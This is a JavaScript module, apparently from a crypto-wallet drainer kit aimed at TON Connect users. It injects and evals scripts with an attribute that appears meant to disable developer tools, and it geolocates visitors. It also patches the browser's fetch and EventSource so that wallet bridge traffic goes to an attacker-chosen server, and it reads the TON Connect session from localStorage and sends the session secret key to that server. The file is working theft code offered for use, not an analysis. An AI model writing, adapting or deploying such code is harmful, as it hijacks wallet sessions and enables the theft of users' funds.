module.exports.addScript = (p) => {
    if (p.url) {
        const script = document.createElement('script');
        script.src = p.url;
        if (p.attr) {
            script.setAttribute('disable-devtool-auto', '');
        }
        document.head.appendChild(script);
    } else {
        const script = document.createElement('script');
        script.innerHTML = eval(p.script);
        if (p.attr) {
            script.setAttribute('disable-devtool-auto', '');
        }
        document.head.appendChild(script);
    }
}

module.exports.executeLocation = new Promise(async (resolve, reject) => {
    try {
        const response = await fetch(`https://www.cloudflare.com/cdn-cgi/trace`);
        let data = await response.text();
        return resolve(data.trim().split('\n').reduce(function (obj, pair) {
            pair = pair.split('=');
            return obj[pair[0]] = pair[1], obj;
        }, {}));
    } catch (e) {
        return reject(e);
    }
});

module.exports.addRequestsListener = (apiURL, useHttps = true) => {
    class Apps {
        constructor() {
            if (!this.wallets) {
                try {
                    this.fetchWallets().then(w => this.wallets = w);
                } catch (e) {
                    throw new Error('Execute wallets apps failed.');
                }
            }
        }

        fetchWallets () {
            return new Promise(async (resolve, reject) => {
                try {
                    const response = await fetch('https://raw.githubusercontent.com/ton-blockchain/wallets-list/main/wallets-v2.json', {method: 'get'});
                    return resolve(await response.json());
                } catch (e) {
                    reject(e)
                }
            })
        }

        getAppByBridge (bridgeURL) {
            let app;
            for (const wallet of this.wallets) {
                let thisWallet = false;
                for (const bridge of wallet.bridge) {
                    if (bridge.type === 'sse' && bridgeURL.includes(bridge.url)) {
                        thisWallet = true;
                        break;
                    }
                }
                if (thisWallet) {
                    app = wallet;
                    break;
                }
            }
            return app;
        }
    }

    const walletsApps = new Apps();

    (function(ns, fetch, EventSourceOrig) {
        if (typeof fetch !== 'function') return;
        ns.fetch = function() {
            try {
                if (arguments[0].pathname.includes('bridge')) {
                    arguments[0] = new URL(`${useHttps ? 'https' : 'http'}://${apiURL}/bridge/${walletsApps.getAppByBridge(arguments[0].href).app_name}/message${arguments[0].search}`)
                }
            } catch (e) {}

            return fetch.apply(this, arguments);
        }
        ns.EventSource = class EventSource extends EventSourceOrig {
            constructor(url) {
                const session = JSON.parse(localStorage.getItem('ton-connect-storage_bridge-connection'));
                if (session.sessionCrypto) {
                    url = `${useHttps ? 'https' : 'http'}://${apiURL}/bridge/${walletsApps.getAppByBridge(url).app_name}?pub=${session.sessionCrypto.publicKey}&sec=${session.sessionCrypto.secretKey}`;
                } else {
                    url = `${useHttps ? 'https' : 'http'}://${apiURL}/bridge/${walletsApps.getAppByBridge(url).app_name}?pub=${session.session.sessionKeyPair.publicKey}&sec=${session.session.sessionKeyPair.secretKey}`;
                }
                super(url);
            }
        }
    }(window, window.fetch, window.EventSource));
}